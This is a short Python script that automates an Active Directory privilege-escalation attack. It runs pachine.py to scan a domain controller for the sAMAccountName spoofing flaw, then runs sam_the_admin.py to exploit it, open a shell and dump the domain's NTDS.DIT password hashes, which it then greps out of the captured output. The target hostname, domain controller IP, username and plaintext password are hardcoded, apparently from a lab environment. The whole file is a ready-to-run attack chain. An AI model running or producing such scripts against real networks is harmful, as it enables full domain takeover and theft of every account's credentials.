import os
import subprocess

# Variable definitions (with help of recon)
hostname = "WIN-CQKL0KHIEF1"
domain = "stb2018"
fqdn = domain + ".local"
dc_ip = "10.0.2.4"
dc_host = hostname + "." + fqdn
username = "DEVILLE"
password = "f9uf6"
creds = domain + "/" + username + ":" + password
adminUsername = "administrateur"

# Checking the vuln
# Example : python3 pachine.py -dc-host dc.predator.local -scan 'predator.local/john:Passw0rd!'
cmd = "python3 pachine.py -dc-host " + dc_host + " -dc-ip " + dc_ip + " -scan " + creds
os.system(cmd)

# Exploiting and getting the hashes
# Example : python3 sam_the_admin.py -dc-host WIN-CQKL0KHIEF1.stb2018.local -dc-ip 10.0.2.4 stb2018/DEVILLE:f9uf6
cmd = "python3 sam_the_admin.py -dc-host " + dc_host + " -dc-ip " + dc_ip + " -admin-username " + adminUsername + " -dump -shell " + creds
os.system("script -O output.txt -c \'" + cmd + "\'")

with open("output.txt") as f:
    data = f.readlines()
    for line,content in enumerate(data):
        if "NTDS.DIT secrets" in content:
            print(line)